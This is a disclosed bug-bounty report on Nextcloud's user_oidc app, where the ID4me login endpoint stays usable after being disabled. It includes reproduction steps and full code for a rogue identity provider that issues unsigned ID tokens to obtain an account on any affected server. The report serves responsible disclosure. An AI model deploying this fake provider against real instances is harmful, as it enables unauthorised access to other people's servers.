# ID4me feature of OpenID connect app available even when disabled 

## Report Details
- **Report ID**: 2376929
- **URL**: https://hackerone.com/reports/2376929
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-02-17T02:39:30.991Z
- **Disclosed**: 2024-05-30T08:31:54.366Z

## Reporter
- **Username**: lukasreschke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
It is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user. This is especially problematic given apps such as Nextcloud Talk enable accessing instance wide chat rooms.

This is caused since the setting to enable/disable ID4ME has no effect at all except hiding the button on the login site. The controllers are however still accessible.

## Steps To Reproduce:

  1. Install user_oidc
  1. Open http://localhost:8080/apps/user_oidc/id4me
  1. As domain choose `id4me.cloud.wtf` which is a small test server that I've created running the below code
  1. Be logged in as new user on the instance.
 
## Supporting Material/References:

For reference purposes, this is the server running the `id4me.cloud.wtf` ID4Me dummy server:

```js
export default {
  async fetch(request, env, ctx) {
    const { pathname } = new URL(request.url);
    //return new Response("disabled");

    if(pathname == "/.well-known/openid-configuration") {
      return new Response('{"issuer":"https://id4me2.cloud.wtf","authorization_endpoint":"https://id4me2.cloud.wtf/auth","token_endpoint":"https://id4me2.cloud.wtf/token","token_introspection_endpoint":"https://id4me2.cloud.wtf/token/introspect","userinfo_endpoint":"https://id4me2.cloud.wtf/userinfo","end_session_endpoint":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/logout","jwks_uri":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/certs","check_session_iframe":"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/login-status-iframe.html","grant_types_supported":["authorization_code","implicit","refresh_token","password","client_credentials"],"response_types_supported":["code","none","id_token","token","id_token token","code id_token","code token","code id_token token"],"subject_types_supported":["public","pairwise"],"id_token_signing_alg_values_supported":["ES384","RS384","HS256","HS512","ES256","RS256","HS384","ES512","RS512"],"userinfo_signing_alg_values_supported":["ES384","RS384","HS256","HS512","ES256","RS256","HS384","ES512","RS512","none"],"request_object_signing_alg_values_supported":["ES384","RS384","ES256","RS256","ES512","RS512","none"],"response_modes_supported":["query","fragment","form_post"],"registration_endpoint":"https://id4me2.cloud.wtf/register","token_endpoint_auth_methods_supported":["private_key_jwt","client_secret_basic","client_secret_post","client_secret_jwt"],"token_endpoint_auth_signing_alg_values_supported":["RS256"],"claims_supported":["sub","iss","auth_time","name","given_name","family_name","preferred_username","email"],"claim_types_supported":["normal"],"claims_parameter_supported":false,"scopes_supported":["openid","profile","roles","phone","offline_access","address","web-origins","email","jpberlin"],"request_parameter_supported":true,"request_uri_parameter_supported":true,"code_challenge_methods_supported":["plain","S256"],"tls_client_certificate_bound_access_tokens":true,"introspection_endpoint":"https://id4me2.cloud.wtf/introspect"}');
    }
    if(pathname == "/register") {
      return new Response('{"client_name": "id4me2.cloud.wtf", "client_id": "id4me2.cloud.wtf", "client_secret": "1234", "client_secret_expires_at": 1921684352, "redirect_uris": ["id4m2.cloud.wtf"], "userinfo_signed_response_alg": ""}');
    }
    if(pathname == "/auth") {
      const { searchParams } = new URL(request.url);
      let redirect_uri = searchParams.get('redirect_uri');
      let state = searchParams.get('state');
      let code = searchParams.get('nonce');

      return Response.redirect(redirect_uri + "?state=" + state + "&code=" + code, 307);
    }
    if(pathname == "/token") {
      let header = btoa(JSON.stringify({  }));
      let payload = btoa(JSON.stringify({ "aud": "id4me2.cloud.wtf", "sub": "admin", "exp": 1771290271 }));

      let fullResponse = JSON.stringify({"id_token": header + "." + payload + ".signature"});
      return new Response(fullResponse);
    }

    return new Response('Hello World!');
  },
};
```

## Impact

It is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user.

## Attachments
No attachments
